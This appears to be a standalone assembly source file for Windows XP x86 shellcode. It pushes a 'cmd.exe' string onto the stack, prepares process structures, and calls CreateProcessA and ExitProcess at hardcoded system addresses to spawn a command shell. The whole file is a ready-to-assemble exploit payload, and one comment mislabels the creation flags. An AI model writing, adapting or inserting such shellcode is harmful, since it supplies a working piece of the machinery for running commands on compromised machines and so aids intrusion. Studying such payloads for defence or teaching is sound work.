; Target: Windows XP x86
; Compile on macOS (ARM): 
; nasm -f bin -o shellcode.bin winxp_createprocess.asm
section .text
    global _start

_start:

    ; Clear registers
    xor edx, edx         
    xor ecx, ecx
    
    ; Build cmd.exe string
    push ecx              ; null terminator
    push 0x657865        ; 'exe'
    push 0x2e646d63      ; 'cmd.'
    mov ebx, esp         ; save ptr to cmd.exe string
    
    ; Create space for STARTUPINFO (68 bytes) and PROCESS_INFORMATION (16 bytes)
    sub esp, 84          ; Total space needed
    mov edi, esp         ; STARTUPINFO structure ptr
    
    ; Initialize STARTUPINFO
    push ecx             ; Clear for multiple writes
    pop eax
    mov ecx, 21          ; 84/4 = 21 DWORDs to clear
    rep stosd            ; Clear the structures
    
    sub edi, 84          ; Move back to start of STARTUPINFO
    mov byte [edi], 68   ; cb = sizeof(STARTUPINFO)
    
    ; Setup CreateProcessA parameters
    lea esi, [edi+68]    ; PROCESS_INFORMATION ptr (after STARTUPINFO)
    push esi             ; lpProcessInformation
    push edi             ; lpStartupInfo
    push ecx             ; lpCurrentDirectory (NULL)
    push ecx             ; lpEnvironment (NULL)
    push 0x00000000      ; dwCreationFlags (INHERIT_HANDLES)
    push 1               ; bInheritHandles (TRUE)
    push ecx             ; lpThreadAttributes (NULL)
    push ecx             ; lpProcessAttributes (NULL)
    push ebx             ; lpCommandLine (cmd.exe)
    push ecx             ; lpApplicationName (NULL)
    
    mov eax, 0x7C80236B  ; CreateProcessA address for WinXP
    call eax
    
    ; Exit cleanly
    push 0               ; Exit code 0
    mov eax, 0x7C81D20A  ; ExitProcess address for WinXP
    call eax